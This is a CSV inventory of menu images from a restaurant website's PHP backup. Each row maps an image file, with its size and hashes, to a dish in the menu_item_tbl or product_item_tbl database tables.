375.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/375.jpg,74793,05e7b5f4a090175d0b0ddac497cfc10b41a9fea0ab5f3816a981cf8d8be814bb,3fc104ab3dc31dd487524714ec69ddc0,DB Mapped (Verified),menu_item_tbl,375,Chop â€“ Spicy Cutlets,menu_small_img
376.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/376.jpg,58390,f56733d11f90fea86c33bbca1e08f476a3b83c9203cfce057bea34cad30deffe,32561173444a48d6a3dc1c1641f44a60,DB Mapped (Verified),menu_item_tbl,376,Kathi Rolls,menu_img
376.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/376.jpg,58390,f56733d11f90fea86c33bbca1e08f476a3b83c9203cfce057bea34cad30deffe,32561173444a48d6a3dc1c1641f44a60,DB Mapped (Verified),menu_item_tbl,376,Kathi Rolls,menu_small_img
377.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/377.jpg,8970,c7e12919d202e9a16085b17b99b7d3e5bf43b01291c25b27ee08f80613532adb,4e0d9320be0fedb06b28e81362a26550,DB Mapped (Verified),menu_item_tbl,377,Roshogullas â€“ Sweet Tooth Love,menu_img
377.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/377.jpg,8970,c7e12919d202e9a16085b17b99b7d3e5bf43b01291c25b27ee08f80613532adb,4e0d9320be0fedb06b28e81362a26550,DB Mapped (Verified),menu_item_tbl,377,Roshogullas â€“ Sweet Tooth Love,menu_small_img
378.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/378.jpg,68962,5329ae76d49987abb4b643612bd4a7e1963d605e898813ca6ff612769e172b82,5d4c5a8e6ec50a629dd97eb1919a0c37,DB Mapped (Verified),menu_item_tbl,378,Sandesh â€“ Sweet Bites,menu_img
378.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/378.jpg,68962,5329ae76d49987abb4b643612bd4a7e1963d605e898813ca6ff612769e172b82,5d4c5a8e6ec50a629dd97eb1919a0c37,DB Mapped (Verified),menu_item_tbl,378,Sandesh â€“ Sweet Bites,menu_small_img
38.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/38.jpeg,5178,e1411fcd2c3cdb3edda6edd0903d973bd2ba07b3c55322ba95c9f231389eb560,959fc549253e4970cc5e73ec67cdc5e0,DB Mapped (Verified),menu_item_tbl,38,Baby Corn Soup,menu_img
38.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/38.jpeg,5178,e1411fcd2c3cdb3edda6edd0903d973bd2ba07b3c55322ba95c9f231389eb560,959fc549253e4970cc5e73ec67cdc5e0,DB Mapped (Verified),menu_item_tbl,38,Baby Corn Soup,menu_small_img
39.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/39.jpg,37099,726aedbfa693846e8f3fe4f9f99a7338d8471eb7451bd5d1a90d1ce7d44e1d70,2e4531cb12d5ad34549ea81714513076,DB Mapped (Verified),menu_item_tbl,39,Tom Yum Soup,menu_img
39.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/39.jpg,37099,726aedbfa693846e8f3fe4f9f99a7338d8471eb7451bd5d1a90d1ce7d44e1d70,2e4531cb12d5ad34549ea81714513076,DB Mapped (Verified),menu_item_tbl,39,Tom Yum Soup,menu_small_img
39.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/39.jpg,37099,726aedbfa693846e8f3fe4f9f99a7338d8471eb7451bd5d1a90d1ce7d44e1d70,2e4531cb12d5ad34549ea81714513076,DB Mapped (Verified),product_item_tbl,39,Capsicum Peanut Chutney,menu_img
40.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/40.jpeg,8806,3196785dcb473a3addde3e61e47a4cf4394fd429586d6952a709af83cd13be62,ce7560b62a34391455eba613561903cf,DB Mapped (Verified),menu_item_tbl,40,Kimchi Soup,menu_img
40.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/40.jpeg,8806,3196785dcb473a3addde3e61e47a4cf4394fd429586d6952a709af83cd13be62,ce7560b62a34391455eba613561903cf,DB Mapped (Verified),menu_item_tbl,40,Kimchi Soup,menu_small_img
41.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/41.jpg,11283,b12e3d6a923bba6ad9e610e3a456151e327b06c368710970c667c84a62703969,55edb66c6842b869e8495b66c72d8df7,DB Mapped (Verified),menu_item_tbl,41,Maxican Soup,menu_img
41.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/41.jpg,11283,b12e3d6a923bba6ad9e610e3a456151e327b06c368710970c667c84a62703969,55edb66c6842b869e8495b66c72d8df7,DB Mapped (Verified),menu_item_tbl,41,Maxican Soup,menu_small_img
41.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/41.jpg,11283,b12e3d6a923bba6ad9e610e3a456151e327b06c368710970c667c84a62703969,55edb66c6842b869e8495b66c72d8df7,DB Mapped (Verified),product_item_tbl,41,Zucchini Chutney,menu_img
42.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/42.jpg,15197,33e4fc6d0bae8d43eff68c4fd4778a3aac53f34acd0ad559d2f7aecea67b2aa1,76ad96f08bd0a53f9882c4deaa6ee3fe,DB Mapped (Verified),menu_item_tbl,42,Tomato Coconut Soup,menu_img
42.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/42.jpg,15197,33e4fc6d0bae8d43eff68c4fd4778a3aac53f34acd0ad559d2f7aecea67b2aa1,76ad96f08bd0a53f9882c4deaa6ee3fe,DB Mapped (Verified),menu_item_tbl,42,Tomato Coconut Soup,menu_small_img
42.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/42.jpg,15197,33e4fc6d0bae8d43eff68c4fd4778a3aac53f34acd0ad559d2f7aecea67b2aa1,76ad96f08bd0a53f9882c4deaa6ee3fe,DB Mapped (Verified),product_item_tbl,42,Walnut Chutney,menu_img
43.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/43.jpg,13879,bcf612883e66b50269e1c82ac8942cf5c2e1b4a6ff8b3918df5aa99bc5b07c13,2d5c295f97537d2a0bcbab0b87beda4a,DB Mapped (Verified),menu_item_tbl,43,Palak Paneer Soup,menu_img
43.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/43.jpg,13879,bcf612883e66b50269e1c82ac8942cf5c2e1b4a6ff8b3918df5aa99bc5b07c13,2d5c295f97537d2a0bcbab0b87beda4a,DB Mapped (Verified),menu_item_tbl,43,Palak Paneer Soup,menu_small_img
43.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/43.jpg,13879,bcf612883e66b50269e1c82ac8942cf5c2e1b4a6ff8b3918df5aa99bc5b07c13,2d5c295f97537d2a0bcbab0b87beda4a,DB Mapped (Verified),product_item_tbl,43,Mango Chutney,menu_img
44.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/44.jpeg,7330,6168da405e08a7a704afaa1fc3848886f9e56dbe8482f52e3bb7f945ead833fd,97362fec920143900fbecc507ea52a59,DB Mapped (Verified),menu_item_tbl,44,Broccoli Almond Soup,menu_img
44.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/44.jpeg,7330,6168da405e08a7a704afaa1fc3848886f9e56dbe8482f52e3bb7f945ead833fd,97362fec920143900fbecc507ea52a59,DB Mapped (Verified),menu_item_tbl,44,Broccoli Almond Soup,menu_small_img
445.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/445.jpg,14845,fb9a212d8dd5bb3d87a9ded514e0ce4e89003846e94c4c15eb7146ac01c457cc,c86fdc8a75bb71a8bfa3861fae2e8828,DB Mapped (Verified),menu_item_tbl,445,Tunday Kebab,menu_img
445.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/445.jpg,14845,fb9a212d8dd5bb3d87a9ded514e0ce4e89003846e94c4c15eb7146ac01c457cc,c86fdc8a75bb71a8bfa3861fae2e8828,DB Mapped (Verified),menu_item_tbl,445,Tunday Kebab,menu_small_img
446.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/446.jpeg,10707,1c745d5e3cbe388385d0b629a64395035a96834af11d71d9546aae2061687335,8bf4f1fe1d4a0eea54300a52a54d7fa8,DB Mapped (Verified),menu_item_tbl,446,Galawati Kebab,menu_img
446.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/446.jpeg,10707,1c745d5e3cbe388385d0b629a64395035a96834af11d71d9546aae2061687335,8bf4f1fe1d4a0eea54300a52a54d7fa8,DB Mapped (Verified),menu_item_tbl,446,Galawati Kebab,menu_small_img
447.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/447.jpg,16461,51c894908e779e3a6a1eabdb4af1ee4fa875909ef6269f0f4e062c97b57bf0de,3e8ac41a3ae2f0aa58aeb9913ad6a2fe,DB Mapped (Verified),menu_item_tbl,447,Lucknowi Biryani,menu_img
447.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/447.jpg,16461,51c894908e779e3a6a1eabdb4af1ee4fa875909ef6269f0f4e062c97b57bf0de,3e8ac41a3ae2f0aa58aeb9913ad6a2fe,DB Mapped (Verified),menu_item_tbl,447,Lucknowi Biryani,menu_small_img
45.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/45.jpeg,11396,ce0cfcfc7cd49ab9cd18c6eb4d624f40f3da62bc91a5fdf0dbce6af398bbd139,86c4de81fd36cb164cf23428f9bdc582,DB Mapped (Verified),menu_item_tbl,45,Manchow Soup,menu_img
45.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/45.jpeg,11396,ce0cfcfc7cd49ab9cd18c6eb4d624f40f3da62bc91a5fdf0dbce6af398bbd139,86c4de81fd36cb164cf23428f9bdc582,DB Mapped (Verified),menu_item_tbl,45,Manchow Soup,menu_small_img
454.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/454.jpg,17993,3442b40381a38d96c4d621feb7f653c26fe80e2c2d5ad3f53a5b59daef28a72b,b33dd36daaf6c19f2d3da21b87fe1f33,DB Mapped (Verified),menu_item_tbl,454,Boti Kebab,menu_img
454.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/454.jpg,17993,3442b40381a38d96c4d621feb7f653c26fe80e2c2d5ad3f53a5b59daef28a72b,b33dd36daaf6c19f2d3da21b87fe1f33,DB Mapped (Verified),menu_item_tbl,454,Boti Kebab,menu_small_img
455.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/455.jpeg,14115,3597c993cc227bf646b3fdb78eb14456c7ca13e680579e9b0c03875a9c670416,0a3c66a54f6b4ccf71b181516f9f1ffa,DB Mapped (Verified),menu_item_tbl,455,Paneer Pasanda,menu_img
455.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/455.jpeg,14115,3597c993cc227bf646b3fdb78eb14456c7ca13e680579e9b0c03875a9c670416,0a3c66a54f6b4ccf71b181516f9f1ffa,DB Mapped (Verified),menu_item_tbl,455,Paneer Pasanda,menu_small_img
456.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/456.jpg,12298,1eff6c6b16421d2725565f6ceaec481df05fd5d89e6849dafd766432f8cf4395,d6dfd56065268fcf17d586f96e7b37bb,DB Mapped (Verified),menu_item_tbl,456,Shabdeg,menu_img
456.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/456.jpg,12298,1eff6c6b16421d2725565f6ceaec481df05fd5d89e6849dafd766432f8cf4395,d6dfd56065268fcf17d586f96e7b37bb,DB Mapped (Verified),menu_item_tbl,456,Shabdeg,menu_small_img
457.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/457.jpeg,10992,20f04a130c787558d99ade8038e195ec5f5c0c3008f7731c9cf804fa1f1417ba,b2f7c4a9dddb53aaf80c5416be2c91c8,DB Mapped (Verified),menu_item_tbl,457,Puri-Sabzi,menu_img
457.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/457.jpeg,10992,20f04a130c787558d99ade8038e195ec5f5c0c3008f7731c9cf804fa1f1417ba,b2f7c4a9dddb53aaf80c5416be2c91c8,DB Mapped (Verified),menu_item_tbl,457,Puri-Sabzi,menu_small_img
458.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/458.jpg,11063,89b253c4feec3d6ecd1b1ecd2207c42ef837d2c8d2ba888e5e675dc07d4b4451,7d652a7d71a29d5cb52a5f604fae6121,DB Mapped (Verified),menu_item_tbl,458,Jalebi,menu_img
458.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/458.jpg,11063,89b253c4feec3d6ecd1b1ecd2207c42ef837d2c8d2ba888e5e675dc07d4b4451,7d652a7d71a29d5cb52a5f604fae6121,DB Mapped (Verified),menu_item_tbl,458,Jalebi,menu_small_img
459.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/459.jpg,52558,c8859d582164b0d0e44240d36188f8cff87d7c0bca33eca4955fb82fc988e44e,70378f43d3d226b52a6856bfba759632,DB Mapped (Verified),menu_item_tbl,459,Banarasi Paan,menu_img
459.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/459.jpg,52558,c8859d582164b0d0e44240d36188f8cff87d7c0bca33eca4955fb82fc988e44e,70378f43d3d226b52a6856bfba759632,DB Mapped (Verified),menu_item_tbl,459,Banarasi Paan,menu_small_img
46.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/46.jpg,64253,0d0a7a1f7f10774b4dfbe74fad2cc79f51d77d8be39977a0a33300b934f275bb,3a2a2ce4f9c53aef407a30aee7da1928,DB Mapped (Verified),menu_item_tbl,46,Mexican Chilli,menu_img
46.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/46.jpg,64253,0d0a7a1f7f10774b4dfbe74fad2cc79f51d77d8be39977a0a33300b934f275bb,3a2a2ce4f9c53aef407a30aee7da1928,DB Mapped (Verified),menu_item_tbl,46,Mexican Chilli,menu_small_img
460.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/460.jpg,11330,afab584ffa39dd605cd769fb0fb5a9eab2054e4600c452941df7031c0dc9151f,5ef28fe2f2b1c75260fa34d13d60c69b,DB Mapped (Verified),menu_item_tbl,460,Bati Chokha,menu_img
460.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/460.jpg,11330,afab584ffa39dd605cd769fb0fb5a9eab2054e4600c452941df7031c0dc9151f,5ef28fe2f2b1c75260fa34d13d60c69b,DB Mapped (Verified),menu_item_tbl,460,Bati Chokha,menu_small_img
461.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/461.jpg,10372,1bb4acf05482e150e9c1922e19d7f2e350b55910d8ae4535bb9eb6b58c78ac8b,1f9b2aca3d407d5a135fac24689c81dc,DB Mapped (Verified),menu_item_tbl,461,Petha,menu_img
461.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/461.jpg,10372,1bb4acf05482e150e9c1922e19d7f2e350b55910d8ae4535bb9eb6b58c78ac8b,1f9b2aca3d407d5a135fac24689c81dc,DB Mapped (Verified),menu_item_tbl,461,Petha,menu_small_img
462.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/462.jpg,15558,3ed5d89e8da2c33fae3d1622aa4a141e072c5833a5463c816032c7f2fd9ba749,9b7cd434c2f787c0dace82d706229447,DB Mapped (Verified),menu_item_tbl,462,Rasmalai,menu_img
462.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/462.jpg,15558,3ed5d89e8da2c33fae3d1622aa4a141e072c5833a5463c816032c7f2fd9ba749,9b7cd434c2f787c0dace82d706229447,DB Mapped (Verified),menu_item_tbl,462,Rasmalai,menu_small_img
463.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/463.jpg,8752,f38a6a06105ab492c5700806977bf022897e31996ca17fcab36584c461063cbd,a12a29739d2662c201a725000f073b84,DB Mapped (Verified),menu_item_tbl,463,Khurchan,menu_img
463.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/463.jpg,8752,f38a6a06105ab492c5700806977bf022897e31996ca17fcab36584c461063cbd,a12a29739d2662c201a725000f073b84,DB Mapped (Verified),menu_item_tbl,463,Khurchan,menu_small_img
464.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/464.jpg,14423,7e95abb0bf12aeca01c75c510f81d1db2d1ab2f30100fd6c76aaca6aeaf082dc,89bb541f7f8fa4c18568a4e84349244c,DB Mapped (Verified),menu_item_tbl,464,Shahi Tukda,menu_img
464.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/464.jpg,14423,7e95abb0bf12aeca01c75c510f81d1db2d1ab2f30100fd6c76aaca6aeaf082dc,89bb541f7f8fa4c18568a4e84349244c,DB Mapped (Verified),menu_item_tbl,464,Shahi Tukda,menu_small_img
465.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/465.jpg,33792,c045b6e664a53b8d49676c30247bfa1cd2e95b12e9bd2260d40be799a8621969,f34525147c9548cd28d0bdc416d927e6,Static / Orphaned Disk Asset,,,,
47.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/47.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,47,Chilli Paneer,menu_img
47.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/47.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,47,Chilli Paneer,menu_small_img
48.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/48.jpeg,8647,e6eea7ed0534012c35c9c96378c33d2821879075b573e8f0bdcfabe6440f0921,2de01fa1ae21ff0682d2fddcece65c30,DB Mapped (Verified),menu_item_tbl,48,Spring Roll,menu_img
48.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/48.jpeg,8647,e6eea7ed0534012c35c9c96378c33d2821879075b573e8f0bdcfabe6440f0921,2de01fa1ae21ff0682d2fddcece65c30,DB Mapped (Verified),menu_item_tbl,48,Spring Roll,menu_small_img
49.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/49.jpg,10123,0f4224ea25d07374e1dffa0288988f559f608d5291f07ec5ac289a43e38965a8,4b996c1bfb5f1c874c86f5623e130902,DB Mapped (Verified),menu_item_tbl,49,Hariyala Kabab,menu_img
49.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/49.jpg,10123,0f4224ea25d07374e1dffa0288988f559f608d5291f07ec5ac289a43e38965a8,4b996c1bfb5f1c874c86f5623e130902,DB Mapped (Verified),menu_item_tbl,49,Hariyala Kabab,menu_small_img
50.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/50.jpeg,12231,5fe96b867d730062bd2f568534dea35ed17b9e78f513a9ce3a98259ca867834d,3fd3439c83ac0ab1d0b3e5cade7a8407,DB Mapped (Verified),menu_item_tbl,50,Dry Manchurian,menu_img
50.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/50.jpeg,12231,5fe96b867d730062bd2f568534dea35ed17b9e78f513a9ce3a98259ca867834d,3fd3439c83ac0ab1d0b3e5cade7a8407,DB Mapped (Verified),menu_item_tbl,50,Dry Manchurian,menu_small_img
51.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/51.jpeg,103548,7ae9832e7ba9c8c42a6e88e24767ccf6866627e19fbcb28f782c3b41fae4521a,14649c870ad339873642567caf699e50,DB Mapped (Verified),menu_item_tbl,51,Wontons (Vegetable/Cheese Paneer /Corn),menu_img
51.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/51.jpeg,103548,7ae9832e7ba9c8c42a6e88e24767ccf6866627e19fbcb28f782c3b41fae4521a,14649c870ad339873642567caf699e50,DB Mapped (Verified),menu_item_tbl,51,Wontons (Vegetable/Cheese Paneer /Corn),menu_small_img
52.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/52.jpg,122380,056502027e0bbdb0aa627b36767cbaabc73348f53559187172cce212c21f1b9a,f7cd7deb5999213ef97e39edf2ac07a2,DB Mapped (Verified),menu_item_tbl,52,Dal Ki Pakori,menu_img
52.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/52.jpg,122380,056502027e0bbdb0aa627b36767cbaabc73348f53559187172cce212c21f1b9a,f7cd7deb5999213ef97e39edf2ac07a2,DB Mapped (Verified),menu_item_tbl,52,Dal Ki Pakori,menu_small_img
53.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/53.jpg,66200,ac86211cc164f49c6a22a91b6c44dd477887995d22bd44d992d5cb91c7e7e561,876d28c234d2de3b1f78c73bd07c176a,DB Mapped (Verified),menu_item_tbl,53,Tanatan Kofta,menu_img
53.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/53.jpg,66200,ac86211cc164f49c6a22a91b6c44dd477887995d22bd44d992d5cb91c7e7e561,876d28c234d2de3b1f78c73bd07c176a,DB Mapped (Verified),menu_item_tbl,53,Tanatan Kofta,menu_small_img
54.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/54.jpg,16438,7410f7bba5dce36bf51ed86340bf0dc65a56e72cb72551fdc4015df265976e11,8b77527c6bea67e10928bee463030263,DB Mapped (Verified),menu_item_tbl,54,Paneer Pakora,menu_img
54.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/54.jpg,16438,7410f7bba5dce36bf51ed86340bf0dc65a56e72cb72551fdc4015df265976e11,8b77527c6bea67e10928bee463030263,DB Mapped (Verified),menu_item_tbl,54,Paneer Pakora,menu_small_img
55.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/55.jpg,20975,067ef257f594e1627c08ce60b6fd5a750a4047394d266722315069235b8fc9ca,fc787928aa74b0de223412c3cbae2108,DB Mapped (Verified),menu_item_tbl,55,Samosa(Matar/Allo),menu_img
55.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/55.jpg,20975,067ef257f594e1627c08ce60b6fd5a750a4047394d266722315069235b8fc9ca,fc787928aa74b0de223412c3cbae2108,DB Mapped (Verified),menu_item_tbl,55,Samosa(Matar/Allo),menu_small_img
56.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/56.jpg,6555,0295b5d331cc2ee1a510684aac8c1ffddcf3bfc496176d8426e91eaa07837fb1,67e341a19d6a74db644f4e3240163886,DB Mapped (Verified),menu_item_tbl,56,French Fry,menu_img
56.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/56.jpg,6555,0295b5d331cc2ee1a510684aac8c1ffddcf3bfc496176d8426e91eaa07837fb1,67e341a19d6a74db644f4e3240163886,DB Mapped (Verified),menu_item_tbl,56,French Fry,menu_small_img
57.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/57.jpg,22373,31bfec092b1043a0227cadd527fcb27c72bc6786ef55aba3b3886dbe018d5b08,8140b9921c8b582edd6af136e569636e,DB Mapped (Verified),menu_item_tbl,57,Roasted Potato,menu_img
57.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/57.jpg,22373,31bfec092b1043a0227cadd527fcb27c72bc6786ef55aba3b3886dbe018d5b08,8140b9921c8b582edd6af136e569636e,DB Mapped (Verified),menu_item_tbl,57,Roasted Potato,menu_small_img
58.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/58.jpg,16182,f4d22d8a4870d8178c1fe88753e5e2b9fe712fa0165c9a68d61118eef63193bc,22cb3a444a28528c8b15e6c710baf7aa,DB Mapped (Verified),menu_item_tbl,58,Roasted Pineapple,menu_img
58.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/58.jpg,16182,f4d22d8a4870d8178c1fe88753e5e2b9fe712fa0165c9a68d61118eef63193bc,22cb3a444a28528c8b15e6c710baf7aa,DB Mapped (Verified),menu_item_tbl,58,Roasted Pineapple,menu_small_img
59.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/59.jpg,12019,a348a79acefe5e61289e2920b5e15f861a963417c3e8e30af75d9147caa77791,2d18f67f876e2da285962e43d7274ddf,DB Mapped (Verified),menu_item_tbl,59,Roasted Mushroom,menu_img
59.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/59.jpg,12019,a348a79acefe5e61289e2920b5e15f861a963417c3e8e30af75d9147caa77791,2d18f67f876e2da285962e43d7274ddf,DB Mapped (Verified),menu_item_tbl,59,Roasted Mushroom,menu_small_img
6.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/6.webp,56850,b9872c83463af683fe8d833fd4c5edf7e29c84acca0b563afcf71139c7751adc,98ad7327cc7f280a534b6179ecc080e3,DB Mapped (Verified),menu_item_tbl,6,Lemon Rice,menu_img
6.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/6.webp,56850,b9872c83463af683fe8d833fd4c5edf7e29c84acca0b563afcf71139c7751adc,98ad7327cc7f280a534b6179ecc080e3,DB Mapped (Verified),menu_item_tbl,6,Lemon Rice,menu_small_img
60.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/60.jpg,20790,87c26c44bf084c856bb7685b2e313771b8f696c7413aa882d76373e95e3d7c4a,909e058b74edb446c31fd91291219b21,DB Mapped (Verified),menu_item_tbl,60,Roasted Cauliflower,menu_img
60.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/60.jpg,20790,87c26c44bf084c856bb7685b2e313771b8f696c7413aa882d76373e95e3d7c4a,909e058b74edb446c31fd91291219b21,DB Mapped (Verified),menu_item_tbl,60,Roasted Cauliflower,menu_small_img
61.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/61.jpeg,13818,5a0cae14485ae2bb650d00a197c106dda70eeda7baf3181d4c657c5503ad62b7,44f79ab7175d327d1fe76e90ce41f069,DB Mapped (Verified),menu_item_tbl,61,Roasted Apple,menu_img
61.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/61.jpeg,13818,5a0cae14485ae2bb650d00a197c106dda70eeda7baf3181d4c657c5503ad62b7,44f79ab7175d327d1fe76e90ce41f069,DB Mapped (Verified),menu_item_tbl,61,Roasted Apple,menu_small_img
62.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/62.jpg,22877,e0562072e1be6f70fb6f637d24cc790a6b802fe3d5745ccd577c4a0b0f0f7bdd,d103e5522ed28bbfc89258f98c14eb80,DB Mapped (Verified),menu_item_tbl,62,Paneer Tikka,menu_img
62.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/62.jpg,22877,e0562072e1be6f70fb6f637d24cc790a6b802fe3d5745ccd577c4a0b0f0f7bdd,d103e5522ed28bbfc89258f98c14eb80,DB Mapped (Verified),menu_item_tbl,62,Paneer Tikka,menu_small_img
63.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/63.jpeg,18215,8584b25caa3f231d001b168fbaed1975af79f21d3239b35737a581bb46b03be0,d76cbb3208da8bf9e4ce847da788e007,DB Mapped (Verified),menu_item_tbl,63,Veg Cutlet,menu_img
63.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/63.jpeg,18215,8584b25caa3f231d001b168fbaed1975af79f21d3239b35737a581bb46b03be0,d76cbb3208da8bf9e4ce847da788e007,DB Mapped (Verified),menu_item_tbl,63,Veg Cutlet,menu_small_img
64.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/64.jpg,14317,c7eb78c49193928cf4bced22fbbc2a30f4451530968d9301347e311c658e069d,0f32383a06ce42c60156386e02b6779f,DB Mapped (Verified),menu_item_tbl,64,Alu Cutlet,menu_img
64.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/64.jpg,14317,c7eb78c49193928cf4bced22fbbc2a30f4451530968d9301347e311c658e069d,0f32383a06ce42c60156386e02b6779f,DB Mapped (Verified),menu_item_tbl,64,Alu Cutlet,menu_small_img
65.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/65.jpeg,10160,cda8d7d839d88e396d8d0d1e014d549bfcca9a933c8c9562c814fa66aff8012b,4b04ce1e4ccf02a5664b6849d79d4644,DB Mapped (Verified),menu_item_tbl,65,Cheese Cutlet,menu_img
65.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/65.jpeg,10160,cda8d7d839d88e396d8d0d1e014d549bfcca9a933c8c9562c814fa66aff8012b,4b04ce1e4ccf02a5664b6849d79d4644,DB Mapped (Verified),menu_item_tbl,65,Cheese Cutlet,menu_small_img
66.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/66.jpg,13125,6674905bef1a288b5b15c42cf9b59f424863750a326efe7977696ea01a14ad3b,a4476789a3d96fad16cd524af556a78a,DB Mapped (Verified),menu_item_tbl,66,Corn Cutlet,menu_img
66.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/66.jpg,13125,6674905bef1a288b5b15c42cf9b59f424863750a326efe7977696ea01a14ad3b,a4476789a3d96fad16cd524af556a78a,DB Mapped (Verified),menu_item_tbl,66,Corn Cutlet,menu_small_img
67.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/67.jpg,12419,407e6d308ba0d6f74460be8a8b0a6f3bd01d4c961cb9d1795c40d4bef758409e,7814a755f3f528effa886fbdd1c1ee93,DB Mapped (Verified),menu_item_tbl,67,Samosa,menu_img
67.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/67.jpg,12419,407e6d308ba0d6f74460be8a8b0a6f3bd01d4c961cb9d1795c40d4bef758409e,7814a755f3f528effa886fbdd1c1ee93,DB Mapped (Verified),menu_item_tbl,67,Samosa,menu_small_img
88.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/88.jpg,13483,4b8a95a3e8517ee648f4eb5366ae3c38c358f8c05a869e3e87ea064a96a3c7f9,50049ebd4c81212736554d7c909f584f,DB Mapped (Verified),menu_item_tbl,88,Kafuli,menu_img
